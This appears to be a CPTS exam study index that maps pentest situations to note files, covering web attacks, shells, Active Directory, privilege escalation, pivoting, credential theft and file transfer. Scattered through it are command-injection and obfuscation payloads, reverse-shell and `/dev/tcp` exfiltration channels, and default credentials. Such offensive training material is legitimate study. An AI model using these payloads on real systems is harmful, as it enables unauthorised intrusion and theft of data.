# CPTS — Attack-Path Triage Map

**Purpose:** symptom / state → which note to open. Use this when you know *what you have* but not *what to try next*.
**Updated:** 2026-05-16

---

## 0. Getting Started — Foundational Pentest Flow (All Exam Targets)

**Entry point:** `getting-started/00-METHODOLOGY.md` — complete 5-phase flow: Recon → Web/Service Enum → Exploit Search → Initial Access → Privilege Escalation.

| Symptom / Phase | Try This |
|---|---|
| **Just got target, no info yet** | `getting-started/00-METHODOLOGY.md` Phase 1 + `03-service-scanning.md` → run `nmap -sV -sC -p- $IP` |
| **Found open ports, need to enum services** | `03-service-scanning.md` → banner grab, identify service versions → searchsploit each version |
| **Port 80/443 open, web app found** | `getting-started/04-web-enumeration.md` → gobuster for dirs, whatweb for tech, robots.txt, source code |
| **Identified CMS/app + version** | `getting-started/00-METHODOLOGY.md` Phase 3 → searchsploit or check `attacking-common-applications/00-METHODOLOGY.md` |
| **Found RCE/exploit, need shell** | `getting-started/05-shell-types-setup.md` → choose reverse/bind/web shell → catch on listener + upgrade TTY |
| **Got low-priv shell, need root** | `getting-started/06-privilege-escalation.md` → `sudo -l` (fastest), cron jobs, SUID bins, SSH keys, credentials |
| **Shell is fragile, drops after 30s** | `getting-started/05-shell-types-setup.md` "Upgrade to Full Interactive TTY" + "Shell Stability Hierarchy" → switch to bind shell |
| **Nmap scan stuck / slow / timing out** | `getting-started/03-service-scanning.md` Exam Speed Tips → run quick scan with top 1000 ports in background |
| **Stuck on privesc > 10 min** | `getting-started/06-privilege-escalation.md` Decision Tree → run LinPEAS, re-check `sudo -l`, enumerate cron + SUID |
| **VPN disconnected / can't reach target** | `getting-started/02-pentest-distro-setup.md` "Troubleshooting VPN Issues" → reconnect, verify routing, check firewall |
| **Common exam mistakes / time wasters** | `getting-started/07-common-pitfalls.md` "Exam Time Management Mistakes" → reference during exam |

---

## 1. Just got a target — recon phase

- **External, no creds, only a domain** → `ad-enum-attacks/04-external-recon.md`
- **Internal, on the network, nothing else** → `ad-enum-attacks/05-initial-domain-enum.md` + `ad-enum-attacks/06-llmnr-nbtns-poisoning-linux.md`
- **Need to interact with random services** → `common-services/01-interacting-with-services.md`

## 1b. Web Reconnaissance — external footprint (only a domain/IP)

**Entry point:** `web-recon/00-METHODOLOGY.md` — 7-phase flow (passive → active DNS → vhost → fingerprint → crawl → automate → hand-off) + Decision Tree + Signal→Counter-Move.

| Symptom / State | Try This |
|---|---|
| Only have a domain name, nothing else | `web-recon/00-METHODOLOGY.md` Phase 1 → `whois \| grep IANA`, `dig NS/MX/TXT`, crt.sh JSON, dorks, Wayback |
| Need subdomains, must stay stealth | Phase 1 → crt.sh JSON API + `site:` dorks + Wayback (zero packets to target) |
| Have domain + its NS records | Phase 2.A → `dig axfr @<each NS> <DOMAIN>` (one query = whole zone; try EVERY NS) |
| Zone transfer denied on all NS | Phase 2.B → `dnsenum -f subdomains-top1million-20000.txt` (escalate to 110k) |
| Subdomain in CT/DNS but page not reachable, or suspect hidden sites on one IP | Phase 3 → vhost fuzz (`gobuster vhost --append-domain`); `/etc/hosts` first |
| Found a vhost, no further progress | Phase 3 gotcha → re-run vhost brute *against the new vhost* (nested vhosts) + pull its `/robots.txt` |
| Need to know server/CMS/WAF before attacking | Phase 4 → `wafw00f` FIRST, then `curl -I`, `<meta generator>`, `nikto -Tuning b` |
| Web app reachable, want hidden paths/intel | Phase 5 → `/robots.txt`, `/sitemap.xml`, `/.well-known/*`, ReconSpider → `jq '.comments'` |
| Many targets / time-boxed recon | Phase 6 → `finalrecon.py --headers --whois --sub --dns --crawl` |
| Everything resolves / every vhost "Found" | Signal→Counter — wildcard DNS/vhost; validate via HTTP fetch, filter `-fs`/`--exclude-length` |
| Recon done — where next | Phase 7 → vhosts→ffuf, stack→web-attacks/common-apps, internal IPs→pivoting, leaked keys→password-attacks |

## 2. Port → service → notes

| Port | Service | Primary note(s) |
|------|---------|-----------------|
| 21 | FTP | `common-services/06-ftp-latest-vulns.md`, `login-brute-forcing/10-ssh-ftp-brute.md` |
| 22 | SSH | `login-brute-forcing/10-ssh-ftp-brute.md` |
| 25 / 110 / 143 | SMTP/POP3/IMAP | `common-services/15-attacking-email-services.md`, `common-services/16-email-latest-vulns.md` |
| 53 | DNS | `common-services/13-attacking-dns.md`, `common-services/14-dns-latest-vulns.md` |
| 88 / 389 / 636 / 3268 | Kerberos / LDAP (DC) | `ad-enum-attacks/05-initial-domain-enum.md`, `ad-enum-attacks/14-credentialed-enum-linux.md` |
| 139 / 445 | SMB | `common-services/07-attacking-smb.md`, `common-services/08-smb-latest-vulns.md` |
| 1433 / 3306 | MSSQL / MySQL | `common-services/19-skills-assessment-hard.md` (MSSQL impersonation), `sql-injection-fundamentals/04-intro-to-mysql.md` |
| 3389 | RDP | `common-services/11-attacking-rdp.md` |
| 5985 / 5986 | WinRM | `ad-enum-attacks/23-privileged-access.md`, `ad-enum-attacks/24-winrm-double-hop-kerberos.md` |
| 80 / 443 | HTTP(S) | go to **§3 — Web symptoms** below |

## 3. Web app — by symptom

| You see... | Try... |
|------------|--------|
| Login form | `login-brute-forcing/08-hydra-http-post-form.md`, `login-brute-forcing/06-hydra.md`, `web-proxies/10-burp-intruder.md` |
| HTTP Basic auth popup | `login-brute-forcing/07-basic-http-auth.md` |
| `?file=`, `?page=`, `?include=`, `?lang=` | `file-inclusion/02-lfi-basics.md` → `03-basic-bypasses.md` → `04-php-filters.md` → `05-php-wrappers.md` |
| LFI confirmed, want RCE | `file-inclusion/05-php-wrappers.md`, `07-lfi-and-file-uploads.md`, `08-log-poisoning.md` |
| LFI but server fetches URL → SSRF/RFI vibes | `file-inclusion/06-rfi.md` |
| URL parameter reflected in page | `xss/03-reflected-xss.md`, `xss/05-xss-discovery.md` |
| Comment / profile / forum field rendered to other users | `xss/02-stored-xss.md`, `xss/06-defacing.md` |
| Client-side JS does `innerHTML`/`document.write` | `xss/04-dom-xss.md` |
| SQL error / weird response on quote | `sql-injection-fundamentals/00-METHODOLOGY.md` (full playbook) or start with `08-intro-to-sqli.md` → `09-subverting-query-logic.md` |
| Login form with quote error → SQLi confirmed | `sql-injection-fundamentals/00-METHODOLOGY.md` Phase 2 (OR/comment bypass) → Phase 3 (union injection) |
| Want to dump database via union injection | `sql-injection-fundamentals/00-METHODOLOGY.md` Phase 3–4 (detect columns + enumerate INFORMATION_SCHEMA) |
| Got SQLi + FILE privilege → want RCE | `sql-injection-fundamentals/00-METHODOLOGY.md` Phase 5 (INTO OUTFILE web shell) |
| Confirmed SQLi, want fast pwn with tool | `sqlmap-fundamentals/04-http-request.md`, `10-os-exploitation.md` |
| SQLi behind WAF / CSRF token | `sqlmap-fundamentals/09-bypassing-protections.md` |
| Need to fuzz hidden params/dirs | `file-inclusion/09-automated-scanning.md`, `web-proxies/10-burp-intruder.md`, `web-proxies/11-zap-fuzzer.md` |
| Need to manipulate raw request | `web-proxies/04-intercepting-requests.md`, `07-repeating-requests.md`, `08-encoding-decoding.md` |
| `401`/`403`/"Access Denied" on a dir or action, but app works some ways | `web-attacks/00-METHODOLOGY.md` Phase 1.A (verb tampering — `OPTIONS` then replay with `HEAD`) |
| Input filter blocks payload (`Malicious Request Denied!`) but accepts benign | `web-attacks/00-METHODOLOGY.md` Phase 1.B (GET→POST, `$_GET` vs `$_REQUEST`) |
| POST reset/action returns "Access Denied" despite valid data | `web-attacks/00-METHODOLOGY.md` Phase 1.B/4 (verb-tamper to GET, session-vs-uid check) |
| Changeable object ref `?uid=`/`?file_id=`/`?id=` shows others' data | `web-attacks/00-METHODOLOGY.md` Phase 2 (IDOR — increment → mass-enumerate) |
| Object ref is base64 (`ZmlsZV8x…`) or 32-hex MD5 | `web-attacks/00-METHODOLOGY.md` Phase 2.B (`09-bypassing-encoded-references.md` — view-source JS, replicate) |
| REST API path `/api.php/profile/1` — guarded writes, open GET | `web-attacks/00-METHODOLOGY.md` Phase 2.C → 4 (`10-idor-insecure-apis.md`, leak uuid → PUT takeover) |
| Need every user's file/doc at once | `web-attacks/00-METHODOLOGY.md` Phase 2.E (`08-mass-idor-enumeration.md` bash loop) |
| App parses XML / SOAP / SVG / DOCX, element reflected | `web-attacks/00-METHODOLOGY.md` Phase 3.A→3.B (XXE: internal entity → `file://` → `php://filter`) |
| XXE works but file has `<`/`>`/`&` chars / no reflection | `web-attacks/00-METHODOLOGY.md` Phase 3.C/3.D (CDATA or error-based external DTD) |
| Fully blind XXE (no reflection, no errors) | `web-attacks/00-METHODOLOGY.md` Phase 3.E (OOB exfil — `php -S`, XXEinjector) |
| Several low-impact web bugs, need real impact | `web-attacks/00-METHODOLOGY.md` Phase 4 (chain: enumerate→leak→escalate→exploit) |
| App "checks" a host/IP/domain (ping, nslookup, whois) | `command-injetions/00-METHODOLOGY.md` Phase 1–2 (`; whoami` / `%0a whoami`, diff baseline) |
| File manager Move/Copy/Convert, or "export PDF"/thumbnail | `command-injetions/00-METHODOLOGY.md` Phase 1 (shells out to `mv`/`cp`/`convert`) → force op to FAIL for output |
| Payload blocked client-side ("match the requested format"), no HTTP request sent | `command-injetions/00-METHODOLOGY.md` Phase 2 (front-end only — replay via Burp Repeater + `Ctrl+U`) |
| Cmd injection confirmed but "Invalid input"/"Malicious request denied!" | `command-injetions/00-METHODOLOGY.md` Phase 4 (test ONE operator at a time; app filter vs WAF) |
| Operator works but space / `/` / command word blocked | `command-injetions/00-METHODOLOGY.md` Phase 5 (`%09`/`${IFS}` → `${PATH:0:1}` → `c'a't`) |
| Many chars filtered / behind WAF | `command-injetions/00-METHODOLOGY.md` Phase 5.D (base64 whole cmd: `bash<<<$(base64 -d<<<...)`) or Bashfuscator |
| Injection runs but no output reflected (blind) | `command-injetions/00-METHODOLOGY.md` Phase 6.C (`sleep 5` timing, `curl`/`nslookup` OOB) |
| Have cmd output → want shell on the box | `command-injetions/00-METHODOLOGY.md` Phase 6.A → `shells-payloads/00-METHODOLOGY.md` |

### Common Web Applications (Tomcat, Jenkins, Splunk, GitLab, ColdFusion, etc.)

**Entry point:** `attacking-common-applications/00-METHODOLOGY.md` — full 5-phase playbook + Decision Tree + Signal→Counter-Move.

| Symptom / State | Try This |
|---|---|
| Port 8080/8180 open, unknown app | `attacking-common-applications/00-METHODOLOGY.md` Phase 1 (EyeWitness/Aquatone screenshot to fingerprint) |
| Tomcat Manager found (port 8080/8180) | `attacking-common-applications/00-METHODOLOGY.md` Phase 2 → try default creds `tomcat:tomcat`, then WAR upload for RCE |
| Tomcat found but auth fails → port 8009 open | CVE-2020-1938 (Ghostcat) AJP LFI — see `attacking-common-applications/10-attacking-tomcat.md` |
| Jenkins instance discovered | `attacking-common-applications/12-attacking-jenkins.md` → Script Console RCE (Groovy) if admin, else password spray → `00-METHODOLOGY.md` Phase 2 |
| Splunk found on port 8000/8089 | `attacking-common-applications/14-attacking-splunk.md` → try default `admin:changeme` → custom malicious app upload for RCE |
| GitLab found, version < 13.10.3 | `attacking-common-applications/18-attacking-gitlab.md` → CVE-2021-22205 ExifTool RCE (auth req'd; try self-register) |
| ColdFusion found on port 8500 | `attacking-common-applications/24-attacking-coldfusion.md` → CVE-2010-2861 (dir traversal no auth) + CVE-2009-2265 (FCKeditor RCE no auth) |
| WordPress/Joomla/Drupal found | `attacking-common-applications/00-METHODOLOGY.md` Phase 2 → enum users, try brute-force, check known plugin vulns |
| OSTicket / PRTG / ManageEngine found | `attacking-common-applications/00-METHODOLOGY.md` Phase 2 → try default creds (PRTG: `prtgadmin:prtgadmin`), search CVE database |
| Got shell on app (Tomcat/Jenkins/Splunk) | `attacking-common-applications/00-METHODOLOGY.md` Phase 5 (post-exploit) → extract config files for db/LDAP creds → pivot |

## 3b. Shells & Payloads — get / stabilise / upgrade a shell

**Entry point:** `shells-payloads/00-METHODOLOGY.md` — 5-phase flow (identify OS → choose direction → deliver payload → catch+verify → upgrade) + Decision Tree + Signal→Counter-Move.

| Symptom / State | Try This |
|---|---|
| Have code-exec, need a shell, don't know which type | `shells-payloads/00-METHODOLOGY.md` Phase 2 → reverse by default (egress beats ingress); bind only if no callback path |
| Fired payload, listener stays silent | Phase 4 / Signal table → AV killed it (Defender silent), wrong LHOST on pivot, or wrong `-f` arch — check listener side first |
| Need a standalone payload binary (phishing/upload/USB) | Phase 3C → `msfvenom -p ... -f elf\|exe\|war`; staged vs stageless = read `/` vs `_` separators |
| `sh: no job control` / `sudo -l` empty / no tab-complete | Phase 5A → `python -c 'import pty;pty.spawn("/bin/bash")'`, else perl/ruby/lua/awk/find/vim fallbacks |
| Web upload worked, want browser RCE | Phase 5B → Laudanum (multi-lang) / Antak (IIS-PS) / WhiteWinterWolf (PHP); then drop reverse shell + delete web shell |
| `.php` upload rejected by filter | Signal table → Burp: change `Content-Type` to `image/gif` (+ `GIF89a` magic bytes if magic-byte check) |
| Windows box, ports 139/445, hint "Blue" | Phase 3D → `auxiliary/scanner/smb/smb_ms17_010` → `exploit/windows/smb/ms17_010_psexec` (EternalBlue → SYSTEM) |
| Pivot: payload from foothold won't call back | Gotcha #2 → LHOST = foothold internal IP (`ip a` on foothold), never Pwnbox external IP |

## 4. Common Services — Initial Access / Lateral Movement

**Entry point:** `common-services/00-METHODOLOGY.md` — full decision tree + Signal→Counter-Move table + Master Cheatsheet.

| Symptom / State | Try This |
|---|---|
| Port 445 (SMB) open, no creds | `common-services/00-METHODOLOGY.md` Phase 2 → try null session (`smbmap -H`) |
| SMB null session works | `common-services/00-METHODOLOGY.md` Phase 2 → enumerate shares, find SSH key or creds in files |
| SMB null session blocks → have user list | `common-services/00-METHODOLOGY.md` Phase 3 → brute-force (check `--pass-pol` first!) |
| Port 21 (FTP) open | `common-services/00-METHODOLOGY.md` Phase 2 → try anonymous login (user: `anonymous`, pwd: blank) |
| FTP anonymous works | `common-services/06-ftp-latest-vulns.md`, `common-services/00-METHODOLOGY.md` Phase 4 (file download) |
| FTP blocks anonymous | Check CoreFTP version (CVE-2022-22836) → `common-services/00-METHODOLOGY.md` Phase 5 (path traversal) |
| Port 3389 (RDP) open + found creds | `common-services/00-METHODOLOGY.md` Phase 4 → RDP login, find NTLM hash → PtH |
| RDP PtH fails (logon failure) | Forgot to enable Restricted Admin Mode — see `common-services/11-attacking-rdp.md` |
| Port 53 (DNS) open | `common-services/00-METHODOLOGY.md` Phase 2 → try zone transfer (`dig AXFR`) |
| DNS zone transfer fails | `common-services/13-attacking-dns.md` → subdomain enum (`subbrute`) → try AXFR on each |
| Port 25 (SMTP) + 110/143 (POP3/IMAP) open | `common-services/00-METHODOLOGY.md` Phase 2 → user enum → password spray → mailbox access |
| Found file with multiple possible passwords | Try against **all** services: SMB, RDP, FTP, SSH (password reuse is common) |
| Have SMB creds, RDP also open | Test RDP with same creds (lateral movement); if different, check PtH (`common-services/11-attacking-rdp.md`) |
| SMB share found, contains `.rdp` / `.kdbx` / `web.config` / `id_rsa` | `common-services/04-finding-sensitive-info.md` → extract and use for next pivot |

## 5. AD — by what you currently have

| State | Next steps |
|-------|------------|
| Network access only | `ad-enum-attacks/05-initial-domain-enum.md`, then `06`/`07` (LLMNR poisoning to grab a hash) |
| LLMNR/NBT-NS hash captured | crack with hashcat → §6 cred-cracking; if cleartext → spray |
| Username list, no passwords | `ad-enum-attacks/08-password-spraying-overview.md` → `10-password-spraying-user-list.md` → `11`/`12` (spray Linux/Windows) |
| Valid domain user creds | `ad-enum-attacks/14-credentialed-enum-linux.md` (or `15` Windows) → run BloodHound → check Kerberoast (`17`/`18`) → check ACLs (`19`/`20`/`21`) |
| Got a Kerberoastable hash | `ad-enum-attacks/17-kerberoasting-linux.md` (crack TGS) |
| NTLM hash, not DA | PtH for lateral movement: `common-services/11-attacking-rdp.md` (RDP), CME/evil-winrm patterns in `ad-enum-attacks/14`/`15` |
| Have WriteDacl / GenericAll on user/group | `ad-enum-attacks/19-acl-abuse-primer.md` → `21-acl-abuse-tactics.md` |
| Local admin on a box | `ad-enum-attacks/22-dcsync.md` (if DA) or dump SAM → §6 |
| DA / Replication rights | `ad-enum-attacks/22-dcsync.md` (full domain dump) |
| Compromised child domain, want parent | `ad-enum-attacks/29-domain-trusts-child-to-parent-linux.md` |
| Cross-forest trust | `ad-enum-attacks/31-cross-forest-trust-abuse-linux.md` |
| Need to enum trusts first | `ad-enum-attacks/27-domain-trusts-primer.md` |
| Looking for unpatched bugs (NoPac/PetitPotam/PrintNightmare) | `ad-enum-attacks/25-bleeding-edge-vulnerabilities.md` |
| Need to enum security controls (Defender/AppLocker/LAPS) | `ad-enum-attacks/13-enumerating-security-controls.md` |
| WinRM session keeps failing on second hop | `ad-enum-attacks/24-winrm-double-hop-kerberos.md` |

## 5b. Windows Privilege Escalation — low-priv shell → SYSTEM

**Entry point:** `windows-privesc/00-METHODOLOGY.md` — 8-phase flow + Decision Tree + Signal→Counter-Move. Always run `whoami /priv` + `whoami /groups` from an **elevated** prompt first.

| Symptom / State | Try This |
|---|---|
| Got low-priv Windows shell, no idea where to start | `windows-privesc/00-METHODOLOGY.md` Phase 1 → `whoami /priv`, `whoami /groups`, `systeminfo`, `netstat -ano`, `ipconfig /all` |
| `whoami /priv` shows **SeImpersonatePrivilege** (MSSQL/IIS/web svc acct) | `windows-privesc/07-seimpersonate.md` → PrintSpoofer (2019+) / JuicyPotato (≤2016) → SYSTEM |
| `whoami /priv` shows **SeDebugPrivilege** | `windows-privesc/08-sedebugprivilege.md` → ProcDump LSASS → Mimikatz |
| `whoami /priv` shows **SeTakeOwnershipPrivilege** | `windows-privesc/09-setakeownershipprivilege.md` → takeown + icacls → read SAM/web.config |
| `whoami /priv` shows **SeBackupPrivilege** / member of **Backup Operators** | `windows-privesc/10-backup-operators.md` → diskshadow → NTDS.dit on DC |
| `whoami /priv` shows **SeLoadDriverPrivilege** / **Print Operators** (Win10<1803) | `windows-privesc/14-print-operators.md` → Capcom.sys → SYSTEM |
| Member of **Server Operators** | `windows-privesc/15-server-operators.md` → `sc config binPath=` add-admin on DC |
| Member of **DnsAdmins** | `windows-privesc/12-dnsadmins.md` → malicious DLL via dnscmd → SYSTEM on DC |
| Member of **Event Log Readers** | `windows-privesc/11-event-log-readers.md` → `wevtutil` grep `/user` for creds |
| Member of **Hyper-V Administrators**, DCs virtualized | `windows-privesc/13-hyperv-admin.md` → offline-mount DC vhdx → NTDS |
| No priv/group win — hunt creds | `windows-privesc/21-credential-hunting-notes.md` + `22`/`23`/`26` → unattend.xml, Winlogon, LaZagne, KeePass, mRemoteNG |
| Found `unattend.xml` / `web.config` / Sticky Notes / PuTTY reg | `windows-privesc/00-METHODOLOGY.md` Phase 4 (credential hunting one-liners) |
| Service runs as SYSTEM, weak ACL / unquoted path | `windows-privesc/17-weak-permissions.md` → SharpUp audit → binary/binpath hijack |
| Unusual 3rd-party app installed (localhost port) | `windows-privesc/19-vulnerable-services.md` → known CVE/PoC (Druva inSync etc.) |
| `AlwaysInstallElevated` both keys `0x1` | `windows-privesc/27-miscellaneous-techniques.md` → msfvenom MSI → SYSTEM |
| Big patch gap / EOL Windows (7 / 2008) | `windows-privesc/18-kernel-exploits.md`, `29`/`30` → HiveNightmare/PrintNightmare/MS16-032 |
| Locked-down Citrix / kiosk desktop | `windows-privesc/24-citrix-breakout.md` → dialog-box UNC breakout |
| User present, all local vectors dead | `windows-privesc/25-interacting-with-users.md` → SCF/LNK + Responder, process monitor |
| Got SYSTEM, now what | `windows-privesc/00-METHODOLOGY.md` Phase 8 → dump SAM/LSASS → PtH fleet → DCSync (`ad-enum-attacks/22-dcsync.md`) |

## 5c. Linux Privilege Escalation — low-priv shell → root

**Entry point:** `linux-privallege-escalation/00-METHODOLOGY.md` — 7-phase flow + Decision Tree + Signal→Counter-Move. Always run `id` + `sudo -l` + SUID find + `getcap` on **every** shell and **every** user you pivot to.

| Symptom / State | Try This |
|---|---|
| Got low-priv Linux shell, no idea where to start | `00-METHODOLOGY.md` Phase 1 → `id; sudo -l; uname -a; echo $PATH; getcap`; SUID find |
| `sudo -l` shows a NOPASSWD binary | Phase 3 → GTFOBins the binary (openssl/tcpdump/vi/less/busctl) |
| `sudo -l` shows `env_keep+=LD_PRELOAD` | `20-shared-libraries-ld-preload.md` → malicious `.so` via any sudo cmd |
| `sudo -l` shows `(ALL, !root)` + sudo <1.8.28 | `23-sudo.md` → CVE-2019-14287 `sudo -u#-1 <bin>` |
| `getcap` shows `cap_setuid` / `cap_dac_override` | `11-capabilities.md` → setuid(0) / vim-edit `/etc/passwd` |
| `id` shows group **lxd / docker / disk / adm** | `10-privileged-groups.md` / `14-lxd.md` / `15-docker.md` (mount host fs / read logs) |
| Writable script run by root cron | `13-cron-job-abuse.md` → append reverse shell + `pspy64` |
| Root cron runs `tar *` in writable dir | `06-wildcard-abuse.md` → `--checkpoint-action` injection |
| Writable dir in `$PATH` / relative cmd in root script | `05-path_abuse.md` → PATH hijack |
| Non-standard SUID/SGID binary | `08-special-permissions.md` (GTFOBins) or `21-shared-object-hijacking.md` (RUNPATH) |
| Stuck in rbash / restricted shell | `07-scaping-restricted-shells.md` → `ssh -t "bash --noprofile"` |
| sudo/SUID python script, writable module / PYTHONPATH | `22-python-library-hijacking.md` |
| `showmount -e` shows `no_root_squash` | `18-miscellaneous-techniques.md` → SUID binary via NFS mount |
| Root tmux socket group-readable | `18-miscellaneous-techniques.md` → `tmux -S <socket>` |
| kubelet 10250 anon reachable | `16-kubernetes.md` → token → privileged pod → host fs |
| No misconfig, box looks OLD (pre-2022 polkit) | `24-polkit.md` → PwnKit CVE-2021-4034 (no prereqs, highest EV) |
| sudo 1.8.31 / 1.9.2 | `23-sudo.md` → Baron Samedit CVE-2021-3156 |
| Kernel 5.8–5.17 / Ubuntu unpatched | `25-dirty-pipe.md` / `19-kernel-exploits.md` (OverlayFS) / `26-netfilter.md` |
| Reverse shell has no TTY, `sudo` fails | Gotcha #2 → `python3 -c 'import pty;pty.spawn("/bin/bash")'` then continue |
| Multi-step chain (hidden file → bash_history → group → WAR → sudo) | `28-skills-assessment.md` + `00-METHODOLOGY.md` Decision Tree |

## 6. Pivoting / Tunneling

**Entry point:** `pivoting-tunneling/00-METHODOLOGY.md` — full decision tree + Signal→Counter-Move table.

| Symptom / state | Goes to |
|---|---|
| Just popped a host, no idea what to do next | `00-METHODOLOGY.md` Phase 1 — run `ifconfig`/`ipconfig /all`, look for second NIC |
| Compromised host has 2+ NICs / extra subnet | `00-METHODOLOGY.md` Phase 2 — sweep new subnet from inside the pivot |
| Have SSH on pivot, want SOCKS for everything | `05-ssh-port-forwarding.md` (dynamic `-D`) + proxychains config |
| Have SSH, want native tools (no proxychains prefix) | `10-sshuttle.md` (transparent VPN over SSH) |
| Need just ONE port from internal target | `05-ssh-port-forwarding.md` (local `-L`) or `06-meterpreter-port-forwarding.md` (`portfwd add`) |
| Internal target can't reach my tun0, need reverse shell | `00-METHODOLOGY.md` §4c — payload `LHOST` = pivot's internal IP; `ssh -R` or `socat fork` |
| Pivot is Windows, no native ssh client | `09-plink-windows.md` + Proxifier |
| Meterpreter on pivot, no SSH access | `06-meterpreter-port-forwarding.md` (`autoroute` + `socks_proxy` / `portfwd`) |
| Plain shell on pivot, no SSH, no MSF | `07-socat-redirection.md` (TCP4-LISTEN fork redirector) |
| Outbound TCP blocked from pivot, ICMP allowed | `13-ptunnel-icmp.md` (last resort) |
| Pivot can dial out to me but I can't reach it inbound | `11-rpivot.md` (reverse SOCKS, needs python2.7) |
| `proxychains nmap` returns all-closed | `00-METHODOLOGY.md` Signal→Counter — switch `-sS` to `-sT -Pn` |
| Reverse shell never arrives | `00-METHODOLOGY.md` Signal→Counter — listener BEFORE payload, LHOST = pivot internal IP |
| Multi-hop to DC (skills assessment style) | `skills-assessment.md` + `00-METHODOLOGY.md` Phase 6 |

## 7. Credential cracking / brute force / theft

**Entry point:** `password-attacks/00-METHODOLOGY.md` — 7-phase Credential Theft Shuffle + Decision Tree + Signal→Counter-Move + hashcat-mode table. Golden rule: don't crack what you can pass; spray every new hash/cred across every host before escalating.

| Have / Symptom | Try This |
|------|------|
| Unknown hash string, don't know format | `00-METHODOLOGY.md` Phase 2 → `hashid -j` → `[[password-attacks/02-introduction-to-password-cracking]]` / `03` / `04` |
| Hash to crack (have GPU/time) | dictionary → `+best64.rule` → mask → custom OSINT list (`password-attacks/04`, `05`) |
| Encrypted file (SSH key/Office/PDF/ZIP/KeePass) | `password-attacks/06-cracking-protected-files.md`, `07` → `*2john` → john/hashcat |
| BitLocker `.vhd` | `password-attacks/07-cracking-protected-archives.md` → `bitlocker2john -i` → `-m 22100` → dislocker mount |
| Reachable WinRM/SSH/RDP/SMB, no creds | `password-attacks/08-network-services.md` (netexec/hydra/evil-winrm/xfreerdp) |
| User list / leaked pairs / vendor device | `password-attacks/09-spraying-stuffing-defaults.md` (pull lockout policy FIRST) |
| Shell on host, hunt creds first | Linux `password-attacks/17`, Windows `password-attacks/15`; saved cred → `runas /savecred` (`13`) |
| pcap / sniffing position | `password-attacks/18-credential-hunting-in-network-traffic.md` (Pcredz + Wireshark) |
| SMB share read access | `password-attacks/19-credential-hunting-in-network-shares.md` (Snaffler/MANSPIDER/nxc --spider) |
| Local admin/root on a host | dump: SAM/SECURITY/SYSTEM (`11`), LSASS (`12`), CredMan (`13`), Linux shadow/keytab (`16`/`22`) |
| Have an NT hash, not cracked | **don't crack** → `password-attacks/20-pass-the-hash.md` (spray `nxc --local-auth -H` + psexec/evil-winrm) |
| Have `.kirbi`/`.ccache`/keytab | `password-attacks/21-pass-the-ticket-from-windows.md` / `22` (Linux: kinit/KRB5CCNAME) |
| Have a `.pfx` cert / `AddKeyCredentialLink` edge | `password-attacks/23-pass-the-certificate.md` (ESC8/ShadowCred → gettgtpkinit → getnthash) |
| DA / replication / DC code-exec | `password-attacks/14-attacking-active-directory-and-ntds.md` → NTDS/DCSync → PtH Administrator |
| NTLMv2 hash from Responder | hashcat `-m 5600` (see `ad-enum-attacks/06`/`07`, `password-attacks/18`) |
| Kerberoast TGS hash | hashcat `-m 13100` (see `ad-enum-attacks/17`) |
| Multi-hop shuffle to DC | `password-attacks/26-skills-assessment.md` + `00-METHODOLOGY.md` Decision Tree |
| Need to spray known cred across services | `login-brute-forcing/06-hydra.md`, `09-medusa.md` |
| Need to filter wordlist before attack | `login-brute-forcing/05-hybrid-attacks.md` |

## 7b. File Transfers — get tools in / loot out

**Entry point:** `file-transfers/00-METHODOLOGY.md` — triage by Direction × OS × open protocol + Decision Tree + Signal→Counter-Move. Golden rule: always have a plan B/C/D and verify the hash (raw channels corrupt silently).

| Have / Symptom | Try This |
|------|------|
| Need a tool on Windows, PowerShell cradle blocked | `file-transfers/00-METHODOLOGY.md` Phase 6 → `certutil`/`bitsadmin`/`GfxDownloadWrapper`; if also blocked → `cscript wget.vbs` (Phase 4) |
| Outbound :80/:443 blocked but :445 open | Phase 1.C → `impacket-smbserver -user test -password test` + `net use` |
| No `curl`/`wget`/`nc` on the Linux box at all | Phase 2.D → `exec 3<>/dev/tcp/<ME>/80` Bash built-in |
| HTTP/FTP/SMB all blocked, one raw TCP port open | Phase 5.A → nc/ncat (`-q0`/`--send-only`) or `cat < /dev/tcp/<ME>/PORT` |
| Exfilling NTDS.dit / hashes / sensitive loot | Phase 7 FIRST → `openssl enc -aes256 -pbkdf2 -iter 100000` / `Invoke-AESEncryption.ps1`, then pick a channel |
| Transferred binary won't run / "not valid Win32" | Signal→Counter — silent truncation (cmd 8191 / raw nc); re-send + `md5sum` ↔ `Get-FileHash` |
| Already RDP'd in / pivoting AD with WinRM | Phase 5 → `\\tsclient\share` or `New-PSSession` + `Copy-Item -To/-FromSession` |

## 8. Reporting (when the engagement is "done")

- Methodology overview → `documentation/01-intro-to-documentation-reporting.md`
- Note structure & evidence handling → `documentation/02-notetaking-and-organization.md`
- Report types & expectations → `documentation/03-types-of-reports.md`
- Required sections → `documentation/04-components-of-a-report.md`
- Writing a finding → `documentation/05-how-to-write-up-a-finding.md`
- QA / polish / templates → `documentation/06-reporting-tips-and-tricks.md`

## 9. Gaps in the vault (don't waste time searching here — go to HTB notes)

- `nmap/`, `footprinting/`, `ffuf/` — notes exist, methodology pending
- `web-recon/` — full methodology + 20 notes (see §1b)
- `shells-payloads/` — full methodology + 18 notes (see §3b)
- `linux-privallege-escalation/` — full methodology + 28 notes (see §5c)
- `password-attacks/` — full methodology + 26 notes (see §7)
- `ad-enum-attacks/` — sections 26, 28, 30, 33, 34, 35 missing

## How to use this with Claude (cheapest path)

1. Tell Claude the **state/symptom** ("I have an NTLM hash for a regular user", "port 88 is open", "found a `?page=` parameter").
2. Claude greps `ATTACK-PATHS.md` and `SEARCH.md` first → resolves to a file path.
3. Claude `Read`s **only** the matching note(s). No vault-wide scanning.
